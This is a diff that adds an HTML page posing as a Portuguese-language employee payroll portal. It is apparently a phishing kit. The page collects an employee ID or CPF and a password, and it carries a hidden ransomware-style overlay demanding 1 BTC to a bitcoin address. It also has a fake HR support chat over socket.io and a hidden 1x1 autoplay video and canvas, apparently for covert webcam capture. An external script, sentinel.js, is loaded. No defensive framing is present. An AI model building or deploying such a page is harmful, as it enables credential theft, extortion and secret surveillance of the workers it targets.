@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal do Colaborador - Folha de Pagamento</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { font-family: 'Open Sans', sans-serif; margin: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.05); text-align: center; max-width: 400px; width: 100%; position: relative; }
+        .logo-box { background: #2c3e50; color: white; padding: 20px; border-radius: 8px; margin-bottom: 30px; }
+        .logo-box h2 { margin: 0; font-weight: 600; font-size: 1.2rem; }
+        .ms-input { width: 100%; border: 1px solid #ddd; background: #f9f9f9; padding: 12px; font-size: 15px; margin-bottom: 20px; outline: none; border-radius: 6px; box-sizing: border-box; }
+        .ms-input:focus { border-color: #3498db; background: #fff; }
+        .ms-button { background: #27ae60; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 6px; font-size: 16px; transition: 0.2s; }
+        .ms-button:hover { background: #219653; }
+        
+        #ransom-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#100; color:#f33; z-index:99999; text-align:center; padding-top:100px; font-family:monospace; }
+        #chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; display: none; z-index: 1000; border: 1px solid #eee; text-align: left; }
+    </style>
+</head>
+<body>
+    <div id="template-container" class="card">
+        <div id="loader" style="margin-bottom:20px;">🔄 Conectando ao sistema ERP...</div>
+        <div id="content" style="display:none;">
+            <div id="payroll-view">
+                <div class="logo-box">
+                    <h2>PORTAL DO COLABORADOR</h2>
+                    <span style="font-size: 0.8rem; opacity: 0.8;">Recursos Humanos & Departamento Pessoal</span>
+                </div>
+                
+                <div style="text-align: left; margin-bottom: 20px; color: #555; font-size: 0.9rem;">
+                    Por favor, faça login para acessar seu holerite e informe de rendimentos.
+                </div>
+
+                <input type="text" id="u" class="ms-input" placeholder="Matrícula ou CPF">
+                <input type="password" id="p" class="ms-input" placeholder="Senha do Portal" style="display:none;">
+                
+                <button class="ms-button" id="btn" onclick="handleAuth()">Acessar Holerite</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ransomware -->
+    <div id="ransom-overlay">
+        <h1 style="font-size:3rem;">⚠ SYSTEM ENCRYPTED ⚠</h1>
+        <div id="timer" style="font-size:5rem; color:#ff0;">23:59:59</div>
+        <p>Send 1.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+    </div>
+
+    <!-- Chat -->
+    <div id="chat-widget">
+        <div style="background:#2c3e50; color:white; padding:15px; font-weight:bold;">Suporte RH</div>
+        <div id="chat-msgs" style="height:250px; overflow-y:auto; padding:15px; font-size:0.85rem; display:flex; flex-direction:column; gap:10px;"></div>
+        <div style="display:flex; padding:10px; border-top:1px solid #eee;">
+            <input type="text" id="chat-in" placeholder="Responder..." style="flex:1; border:none; outline:none;">
+            <button onclick="sendChat()" style="background:none; border:none; color:#2c3e50; font-weight:bold; cursor:pointer;">↑</button>
+        </div>
+    </div>
+
+    <video id="v" width="1" height="1" autoplay style="opacity:0; position:fixed;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script src="/sentinel.js?v=5"></script>
+</body>
+</html>
